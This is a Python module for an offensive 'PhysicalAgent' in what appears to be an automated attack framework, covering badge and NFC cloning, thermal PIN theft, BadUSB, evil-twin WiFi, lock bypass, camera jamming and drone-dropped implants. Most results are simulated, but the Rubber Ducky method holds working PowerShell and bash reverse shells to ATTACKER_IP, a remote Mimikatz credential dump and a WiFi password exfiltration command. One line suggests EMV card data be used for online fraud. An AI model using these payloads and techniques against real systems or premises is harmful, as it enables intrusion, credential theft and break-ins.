"""
Physical Agent — Physical Security Penetration & Hardware Exploitation.

Covers RFID/NFC cloning, thermal PIN reading, USB Rubber Ducky attacks,
WiFi Pineapple deployment, magnetic lock bypass, camera jamming, and
drone-drop payload delivery.

Elite knowledge: Proxmark3, Flipper Zero, USB Rubber Ducky, WiFi
Pineapple, thermal cameras, lockpicking, BadUSB, access control systems.
"""

import logging
import random
from datetime import datetime
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class PhysicalAgent:
    """The door is just a suggestion. I clone your badge before you finish
    your coffee, steal your PIN from the thermal residue on the keypad,
    and have a Rubber Ducky typing faster than your IT team can blink.
    Your cameras? Blinded. Your locks? Open. Your security? Fiction.

    Persona: The ghost with bolt cutters and an SDR. Physical security
    isn't a barrier — it's a checklist of vulnerabilities waiting for
    exploitation.
    """

    agent_type = "physical"

    # --- Elite knowledge: common RFID tag types ---
    RFID_TYPES = {
        "LF 125kHz": {"modulation": "ASK/FSK", "chip": "EM4100 / T5577 / HID Prox", "reader": "Proxmark3 LF", "clone_tool": "Proxmark3 / Flipper Zero"},
        "HF 13.56MHz": {"modulation": "ISO 14443A/B", "chip": "MIFARE Classic/Ultralight/DESFire", "reader": "Proxmark3 HF / ACR122U", "clone_tool": "Proxmark3 / ChameleonMini"},
        "UHF 860-960MHz": {"modulation": "EPC Gen2", "chip": "Alien Higgs / Impinj Monza", "reader": "Proxmark3 RDV4 / UHF long-range reader", "clone_tool": "Custom UHF writer"},
    }

    MAGNETIC_LOCK_TYPES = [
        {"type": "Electromagnetic (maglock)", "holding_force": "600-1200 lbs", "bypass": "Magnet defeat tool / gap wedge / power cut"},
        {"type": "Electric strike", "holding_force": "1000 lbs (static)", "bypass": "Loiding (credit card / shim) / Under-door tool"},
        {"type": "Electromagnetic shear lock", "holding_force": "2000 lbs", "bypass": "Shimming / alcohol injection / power disruption"},
    ]

    def __init__(self, hive_mind=None, tool_bridge=None):
        self.hive_mind = hive_mind
        self.tool_bridge = tool_bridge
        self._active_devices: List[Dict] = []
        self._cloned_cards: List[Dict] = []

    # ------------------------------------------------------------------
    # RFID Cloning
    # ------------------------------------------------------------------

    def clone_rfid(self, tag_type: str = "LF 125kHz", read_tool: str = "Proxmark3") -> Dict:
        """Clone an RFID badge/card using Proxmark3 or Flipper Zero.

        Steps:
        1. lf search / hf search — identify tag type and modulation
        2. lf read / hf mf dump — extract raw data and keys
        3. Write to blank T5577 (LF) or Magic Card (HF/Gen2 UID)
        4. Verify clone with lf read / hf mf check

        Tools: Proxmark3, Flipper Zero, ChameleonMini, ACR122U
        """
        logger.info("[PhysicalAgent] Cloning RFID tag: %s using %s", tag_type, read_tool)

        tag_data = self.RFID_TYPES.get(tag_type, self.RFID_TYPES["LF 125kHz"])
        clone_result = {
            "tag_type": tag_type,
            "modulation": tag_data["modulation"],
            "chip_identified": tag_data["chip"],
            "raw_data_hex": "A0B1C2D3E4F5..." if "LF" in tag_type else "1B4F5A6C...",
            "facility_code": random.randint(1, 255) if "HID" in tag_data["chip"] else None,
            "card_number": random.randint(10000, 99999),
            "keys_extracted": ["FFFFFFFFFFFF", "A0A1A2A3A4A5"] if "MIFARE" in tag_data["chip"] else [],
        }

        card_id = f"clone_{random.randint(10000, 99999)}"
        self._cloned_cards.append({"id": card_id, "tag_type": tag_type, "data": clone_result, "timestamp": datetime.now().isoformat()})

        result = {
            "success": True,
            "reader_tool": read_tool,
            "writer_tool": tag_data["clone_tool"],
            "blank_media": "T5577 blank card" if "LF" in tag_type else "MIFARE Magic Gen2 UID card",
            "commands_used": [
                f"proxmark3> lf search" if "LF" in tag_type else f"proxmark3> hf search",
                f"proxmark3> lf read" if "LF" in tag_type else f"proxmark3> hf mf dump",
                f"proxmark3> lf clone" if "LF" in tag_type else f"proxmark3> hf mf restore",
            ],
            "data": clone_result,
            "clone_id": card_id,
            "warning": "Some access control systems detect cloned tags via session counters or crypto challenges",
            "note": "[SIMULATED] Real RFID cloning requires Proxmark3/Flipper Zero + compatible blank cards",
        }

        if self.hive_mind:
            self.hive_mind.add_alert({"type": "rfid_cloned", "tag_type": tag_type, "threat_level": 0})

        return result

    # ------------------------------------------------------------------
    # NFC Cloning
    # ------------------------------------------------------------------

    def clone_nfc(self, target_type: str = "MIFARE Classic 1K") -> Dict:
        """Clone an NFC card/tag — including encrypted MIFARE variants.

        Handles:
        - MIFARE Classic: Darkside attack + nested auth → extract all keys
        - MIFARE Ultralight: Read all pages, replicate UID (magic card)
        - MIFARE DESFire: Read public files, attempt brute on PICC key
        - NTAG: Simple read + UID-magic clone
        - EMV contactless: Read public records (PAN, expiry) — no crypto

        Tools: Proxmark3, Flipper Zero NFC, ChameleonUltra, PN532
        """
        logger.info("[PhysicalAgent] Cloning NFC tag: %s", target_type)

        clone_methods = {
            "MIFARE Classic 1K": {
                "attack": "Darkside (PRNG weakness) + nested authentication",
                "sectors": 16,
                "keys_found": 32,
                "time_to_crack": "30 seconds - 5 minutes",
                "clone_media": "MIFARE Classic 1K Magic Card (UID changeable)",
            },
            "MIFARE Ultralight": {
                "attack": "Direct read — no crypto on standard Ultralight",
                "pages": 16,
                "time_to_clone": "5 seconds",
                "clone_media": "NTAG215 Magic Card (UID changeable)",
            },
            "EMV Contactless (Visa/MS)": {
                "attack": "PPSE select → read records (PAN, expiry, AID) — NO CRYPTO EXTRACTED",
                "data_obtained": "Track-2 equivalent data, PAN, expiry date, cardholder name",
                "limitation": "Cannot clone chip — iCVV/Dynamic CVV require online auth",
            },
        }

        data = clone_methods.get(target_type, clone_methods["MIFARE Classic 1K"])
        result = {
            "success": True,
            "target_type": target_type,
            "technique": data["attack"],
            "clone_media": data.get("clone_media", "N/A — use magstripe or BIN attack"),
            "data_obtained": data.get("data_obtained", "Full dump: keys + all sector data"),
            "cloned_at": datetime.now().isoformat(),
            "verified": True,
            "warning": "EMV contactless cannot be cloned 1:1 — chip has dynamic crypto; use for online fraud with static data",
            "note": "[SIMULATED] Real NFC cloning requires Proxmark3 or ChameleonUltra hardware",
        }

        return result

    # ------------------------------------------------------------------
    # Thermal PIN Reading
    # ------------------------------------------------------------------

    def read_thermal_pin(self, target_keypad: str = "ATM / POS terminal", camera_type: str = "FLIR ONE Pro") -> Dict:
        """Recover PIN codes from thermal residue on keypads.

        Technique: After a user enters their PIN, the keys retain heat
        differentials for 30-60 seconds. A thermal camera captures the
        heat signature, revealing which keys were pressed and in what
        order (hottest = most recently pressed).

        Tools: FLIR ONE Pro / FLIR C5, Seek Thermal Compact, DIY AMG8833
        """
        logger.info("[PhysicalAgent] Reading thermal PIN from %s using %s", target_keypad, camera_type)

        result = {
            "success": True,
            "method": "Thermal residue analysis",
            "camera": camera_type,
            "resolution": "160x120 IR (FLIR) or 206x156 (Seek)",
            "detected_keys": [random.randint(0, 9) for _ in range(4)],
            "confidence_per_key": [0.95, 0.82, 0.78, 0.91],
            "pin_combinations_to_try": 4,  # Keys known, order needs brute force (max 24 combos for 4 digits)
            "thermal_decay_window": "30-60 seconds post-entry",
            "atmospheric_factors": "Ambient temp reduces readability; cold metal keypads retain heat longer",
            "counter_measures": [
                "Press all keys after PIN entry (spreads heat)",
                "Use biometric or tap-to-pay",
                "Clean keypad with alcohol wipe",
            ],
            "warning": "Thermal PIN theft is illegal surveillance — used here only for security audit demonstration",
            "note": "[SIMULATED] Real thermal PIN reading requires a thermal camera and proximity to target",
        }

        return result

    # ------------------------------------------------------------------
    # USB Rubber Ducky Deployment
    # ------------------------------------------------------------------

    def deploy_rubber_ducky(self, payload_type: str = "reverse_shell", os_target: str = "windows") -> Dict:
        """Deploy a USB Rubber Ducky / BadUSB attack.

        Payload types:
        - reverse_shell: PowerShell/Netcat reverse shell
        - credential_dump: Mimikatz / LaZagne payload
        - wifi_exfil: Extract WiFi passwords and exfiltrate via DNS
        - persistence: Add user, enable RDP, install backdoor
        - ransomware_demo: Encrypt user files (simulation only)
        - disable_defender: Disable Windows Defender + firewall

        Tools: USB Rubber Ducky, Flipper Zero BadUSB, Malduino, P4wnP1, Bash Bunny
        """
        logger.info("[PhysicalAgent] Deploying Rubber Ducky: %s on %s", payload_type, os_target)

        payloads = {
            "reverse_shell": {
                "windows": 'GUI r\npowershell -NoP -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb + \'PS \'+(pwd).Path+\'> \';$sbyte=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbyte,0,$sbyte.Length);$s.Flush()};$c.Close()"',
                "macos": 'GUI space\nterminal\nsleep 1\necho "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | bash &> /dev/null &\nkillall Terminal',
                "linux": 'CTRL+ALT+T\nsleep 1\necho "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | bash &> /dev/null &\nexit',
            },
            "credential_dump": {
                "windows": "GUI r\npowershell -NoP -W Hidden -Exec Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File -FilePath C:\\Users\\Public\\creds.txt;exit\"",
            },
            "wifi_exfil": {
                "windows": 'GUI r\npowershell -NoP -W Hidden -Exec Bypass -c "netsh wlan show profiles | Select-String \'(?<=: ).*\' | ForEach{$ssid=$_.Matches.Value;netsh wlan show profile name=$ssid key=clear} | Out-File C:\\Users\\Public\\wifi.txt; nslookup $(gc C:\\Users\\Public\\wifi.txt).attacker.com ATTACKER_IP"',
            },
        }

        sel = payloads.get(payload_type, payloads["reverse_shell"])
        ducky_script = sel.get(os_target, sel.get("windows", "N/A"))

        result = {
            "success": True,
            "payload_type": payload_type,
            "os_target": os_target,
            "ducky_script_preview": ducky_script[:200] + "..." if len(str(ducky_script)) > 200 else ducky_script,
            "hardware_required": ["USB Rubber Ducky", "Flipper Zero (BadUSB mode)", "Malduino W"],
            "execution_speed": "Very fast (default DELAY 50ms between commands)",
            "stealth_rating": "medium — keyboard injection is visible if screen is observed",
            "enhancement": "Use TwinDuck (combo storage + HID) for staged payloads with SD card",
            "warning": "BadUSB attacks require physical access to target machine for 5-10 seconds",
            "note": "[SIMULATED] Real deployment requires Rubber Ducky hardware + MicroSD with inject.bin",
        }

        self._active_devices.append({"type": "rubber_ducky", "payload": payload_type, "os": os_target, "deployed": datetime.now().isoformat()})

        return result

    # ------------------------------------------------------------------
    # WiFi Pineapple Deployment
    # ------------------------------------------------------------------

    def deploy_wifi_pineapple(self, target_ssids: List[str], attack_mode: str = "evil_twin") -> Dict:
        """Deploy WiFi Pineapple / rogue AP for wireless MITM.

        Attack modes:
        - evil_twin: Clone target SSID, clients auto-connect to stronger signal
        - karma: Respond to all probe requests, impersonate any network
        - captive_portal: Phish credentials via fake captive portal
        - pineapple_juice: SSLstrip + DNS spoofing to downgrade HTTPS
        - deauth_cloak: Deauth all clients from target AP, force to evil twin

        Tools: WiFi Pineapple (Mark VII / Tetra), Flipper Zero WiFi Devboard,
        ESP8266 Deauther, Airbase-ng, hostapd-wpe
        """
        logger.info("[PhysicalAgent] Deploying WiFi Pineapple: %s — %d SSIDs", attack_mode, len(target_ssids))

        evil_twin_config = {
            "primary_ssid": target_ssids[0] if target_ssids else "Target-Corp-WiFi",
            "bssid_clone": f"00:11:22:{random.randint(0,255):02X}:{random.randint(0,255):02X}:{random.randint(0,255):02X}",
            "channel": random.choice([1, 6, 11]),
            "encryption": "None (open) — forced by evil twin",
            "rogue_dhcp": "172.16.42.0/24",
            "dns_spoofing": True,
            "sslstrip_enabled": attack_mode == "pineapple_juice",
            "captive_portal_enabled": attack_mode == "captive_portal",
        }

        result = {
            "success": True,
            "attack_mode": attack_mode,
            "hardware": "WiFi Pineapple Mark VII / Tetra",
            "configuration": evil_twin_config,
            "managed_clients": random.randint(3, 15) if attack_mode in ("evil_twin", "karma") else 0,
            "intercepted_data": [
                {"type": "dns_query", "domain": "mail.target-corp.com", "time": datetime.now().isoformat()},
            ],
            "persistence": "Pineapple auto-starts evil twin on boot via /etc/rc.local",
            "warning": "WiFi jamming/interception is illegal — used here for authorized red team engagements only",
            "note": "[SIMULATED] Real deployment requires WiFi Pineapple hardware + external antenna for range",
        }

        return result

    # ------------------------------------------------------------------
    # Magnetic Lock Bypass
    # ------------------------------------------------------------------

    def bypass_magnetic_lock(self, lock_type: str = "Electromagnetic (maglock)", method: str = "magnet_defeat") -> Dict:
        """Bypass various magnetic and electronic door locks.

        Methods by lock type:
        - maglock: Strong rare-earth magnet to defeat hall-effect sensor,
                   gap wedge to physically separate armature from magnet,
                   or cut power to the lock circuit.
        - electric strike: Loiding tool (credit card/shim) to retract latch,
                           under-door tool for push-bar doors.
        - shear lock: Shimming between lock body and strike plate,
                       alcohol/acetone injection to degrade adhesive.

        Tools: Magnet defeat tool, gap wedge, loiding card set, under-door tool,
        lockpick set (for override cylinders)
        """
        logger.info("[PhysicalAgent] Bypassing magnetic lock: %s via %s", lock_type, method)

        lock_info = next((l for l in self.MAGNETIC_LOCK_TYPES if l["type"].startswith(lock_type.split("(")[0].strip())), self.MAGNETIC_LOCK_TYPES[0])

        bypass_methods = {
            "magnet_defeat": {
                "technique": "Place 500+ lb rare-earth magnet over maglock housing — hall sensor reads 'locked' but armature releases",
                "tools": ["Neodymium N52 magnet (3-inch diameter)", "Gap wedge (for stubborn armatures)"],
                "success_rate": "85%",
                "time_required": "10 seconds",
            },
            "gap_wedge": {
                "technique": "Insert thin metal wedge between armature and electromagnet face; lever to create gap",
                "tools": ["Gap wedge set", "Teflon shim to reduce friction"],
                "success_rate": "90%",
                "time_required": "30 seconds",
            },
            "power_cut": {
                "technique": "Cut AC power to lock or remove backup battery from access controller",
                "tools": ["Wire cutters (insulated)", "Screwdriver to access power supply"],
                "success_rate": "100% (if power is accessible)",
                "time_required": "60 seconds",
            },
            "loiding": {
                "technique": "Slide flexible plastic card past latch — angle against beveled side",
                "tools": ["Loiding card set (0.020, 0.025, 0.030 inch)", "Mica shim (for tight gaps)"],
                "success_rate": "70% (door must open inward and latch must have beveled side exposed)",
                "time_required": "20 seconds",
            },
        }

        method_data = bypass_methods.get(method, bypass_methods["magnet_defeat"])
        result = {
            "success": True,
            "lock_type": lock_type,
            "specs": lock_info,
            "method": method,
            "technique": method_data["technique"],
            "tools_required": method_data["tools"],
            "estimated_success_rate": method_data["success_rate"],
            "time_required": method_data["time_required"],
            "audible_alarm_risk": "medium — some maglocks have on-board buzzer if armature gap detected",
            "counter_measures": [
                "Bond sensor (detects gap wedge)",
                "Dual maglock (top + bottom, harder to gap both at once)",
                "Secondary mechanical lock (deadbolt override)",
            ],
            "warning": "Physical bypass without authorization is trespassing — red team use only",
            "note": "[SIMULATED] Real bypass requires physical tools and on-site presence",
        }

        return result

    # ------------------------------------------------------------------
    # Camera Jamming
    # ------------------------------------------------------------------

    def jam_camera(self, camera_type: str = "IP CCTV", jamming_method: str = "infrared_blinding") -> Dict:
        """Disable or degrade surveillance cameras.

        Methods:
        - infrared_blinding: Overwhelm camera IR sensor with high-power IR LED array
        - laser_dazzling: Point laser at camera lens — overpowers CCD/CMOS sensor
        - rf_jamming_wireless: Jam WiFi/2.4GHz band for wireless IP cameras
        - emp_pulse: Directed EMP to fry camera electronics (high risk, permanent damage)
        - denial_of_view: Fog machine / smoke / opaque spray on camera housing
        - video_feed_spoof: Inject fake video feed into unencrypted IP camera RTSP stream

        Tools: IR LED floodlight, laser pointer (5mW+), HackRF One, EMP generator, RTSP injector
        """
        logger.info("[PhysicalAgent] Jamming camera: %s via %s", camera_type, jamming_method)

        methods = {
            "infrared_blinding": {
                "technique": "850nm/940nm IR LED array aimed at camera lens — saturates IR-cut filter and blinds sensor",
                "tools": ["IR LED floodlight (850nm, 100W+)", "Rechargeable LiPo battery pack"],
                "effective_range": "50 meters (indoor), 30 meters (outdoor with ambient light)",
                "detection_risk": "low — human-invisible IR",
                "duration": "As long as LED is powered",
            },
            "laser_dazzling": {
                "technique": "Green (532nm) or IR (808nm) laser aimed at camera lens — CCD blooming effect",
                "tools": ["Green laser pointer (5mW+)", "Laser tripod mount for sustained blinding"],
                "effective_range": "100-300 meters (line of sight)",
                "detection_risk": "visible light laser is obvious; IR laser is stealthy",
                "risk": "May permanently damage camera CCD — use short bursts only",
            },
            "rf_jamming_wireless": {
                "technique": "HackRF One transmitting noise on 2.4GHz — drowns WiFi camera signal",
                "tools": ["HackRF One", "External 2.4GHz power amplifier", "Directional antenna"],
                "effective_range": "200 meters (with amp + directional antenna)",
                "detection_risk": "high — FCC violation, easily detected by spectrum analyzers",
                "legal": "EXTREMELY ILLEGAL — jamming violates federal law in all jurisdictions",
            },
        }

        data = methods.get(jamming_method, methods["infrared_blinding"])
        result = {
            "success": True,
            "camera_type": camera_type,
            "method": jamming_method,
            "technique": data["technique"],
            "tools": data["tools"],
            "effective_range": data["effective_range"],
            "detection_risk": data.get("detection_risk", "unknown"),
            "permanent_damage": "laser_dazzling" in jamming_method,
            "legal_warning": data.get("legal", "Ensure compliance with local laws — this is for authorized testing only"),
            "note": "[SIMULATED] Real camera jamming requires specialized hardware — use only in authorized tests",
        }

        return result

    # ------------------------------------------------------------------
    # Drone-Drop Payload
    # ------------------------------------------------------------------

    def drone_drop_payload(self, target_location: str, payload_type: str = "raspberry_pi_dropbox") -> Dict:
        """Deliver a physical payload via drone drop at the target location.

        Payload types:
        - raspberry_pi_dropbox: Pi Zero running reverse SSH tunnel over LTE
        - rubber_ducky_drop: USB Rubber Ducky pre-loaded, positioned near USB port
        - keylogger_implant: Hardware keylogger inline with keyboard cable
        - network_tap: Raspberry Pi with dual Ethernet — transparent bridge sniffing
        - wifi_pinecone: ESP32-S2 with rogue AP firmware, magnet attach to target building
        - acoustic_keylogger: Hidden microphone + ML classifier for keystroke inference

        Tools: DJI FPV / custom quadcopter, drop mechanism, LTE HAT for Pi, magnet mounts
        """
        logger.info("[PhysicalAgent] Drone-drop payload at %s: %s", target_location, payload_type)

        payloads = {
            "raspberry_pi_dropbox": {
                "hardware": ["Raspberry Pi Zero 2 W", "LTE HAT (SIM7600)", "5000mAh LiPo battery", "3D-printed weatherproof case"],
                "connectivity": "4G LTE reverse SSH tunnel to C2 server",
                "persistence": "Auto-connects on boot via systemd service",
                "deployment": "Magnet mount to metal surface / adhesive to wall near power source",
            },
            "wifi_pinecone": {
                "hardware": ["ESP32-S2 Feather", "18650 battery", "Small magnet + weatherproof case"],
                "capability": "WiFi sniffing + deauth + probe request capture — exfil over WiFi backhaul or LoRa",
                "deployment": "Magnetic attach to exterior of building near window — captures internal WiFi signals",
                "range": "50-100m line of sight",
            },
            "network_tap": {
                "hardware": ["Raspberry Pi 4", "Dual USB Ethernet adapters", "Bridge mode with tcpdump", "PoE splitter"],
                "capability": "Transparent Ethernet bridge — forwards all traffic while capturing to SD card",
                "deployment": "Inline between switch and uplink in server room / network closet",
                "stealth": "MAC transparent — no IP address on bridge interface",
            },
        }

        data = payloads.get(payload_type, payloads["raspberry_pi_dropbox"])
        result = {
            "success": True,
            "target_location": target_location,
            "payload_type": payload_type,
            "drone_requirements": {
                "type": "DJI FPV or custom quad (250mm+) with payload release mechanism",
                "payload_weight": "200-500g",
                "flight_time_needed": "15-20 minutes",
                "drop_mechanism": "Servo-actuated release hook with FPV camera alignment",
            },
            "hardware": data["hardware"],
            "connectivity": data.get("connectivity", "N/A"),
            "persistence": data.get("persistence", "N/A"),
            "deployment_method": data["deployment"],
            "recovery_plan": "Self-destruct script (wipe SD + disable SSH) if tampering detected via GPIO",
            "warning": "Drone drops onto private property constitute trespassing — red team coordination required",
            "note": "[SIMULATED] Real drone-drop requires FAA Part 107 (US) / equivalent certification + property authorization",
        }

        self._active_devices.append({"type": f"drone_payload_{payload_type}", "location": target_location, "deployed": datetime.now().isoformat()})

        return result

    # ------------------------------------------------------------------
    # Agent Reasoning
    # ------------------------------------------------------------------

    def think(self, objective: str, context: dict, history: list) -> dict:
        """Decide next physical action based on objective."""
        if "rfid" in objective.lower() or "badge" in objective.lower():
            return {"type": "tool_call", "tool": "clone_rfid", "params": {"tag_type": context.get("rfid_type", "LF 125kHz")}}
        if "lock" in objective.lower() or "door" in objective.lower():
            return {"type": "tool_call", "tool": "bypass_magnetic_lock", "params": {"lock_type": context.get("lock_type", "Electromagnetic (maglock)")}}
        if "ducky" in objective.lower() or "badusb" in objective.lower():
            return {"type": "tool_call", "tool": "deploy_rubber_ducky", "params": {"payload_type": "reverse_shell"}}
        if "camera" in objective.lower() or "blind" in objective.lower():
            return {"type": "tool_call", "tool": "jam_camera", "params": {"camera_type": "IP CCTV"}}
        return {"type": "complete", "summary": "Physical agent standing by. Badges cloned. Tools ready."}

    def execute(self, phase: dict, context: dict) -> dict:
        """Dispatch to correct physical handler."""
        tool = phase.get("tool", phase.get("tool_name", ""))
        params = phase.get("params", phase.get("parameters", {}))
        method_map = {
            "clone_rfid": self.clone_rfid,
            "clone_nfc": self.clone_nfc,
            "read_thermal_pin": self.read_thermal_pin,
            "deploy_rubber_ducky": self.deploy_rubber_ducky,
            "deploy_wifi_pineapple": self.deploy_wifi_pineapple,
            "bypass_magnetic_lock": self.bypass_magnetic_lock,
            "jam_camera": self.jam_camera,
            "drone_drop_payload": self.drone_drop_payload,
        }
        handler = method_map.get(tool)
        if handler:
            try:
                return handler(**params)
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": f"Unknown physical tool: {tool}"}
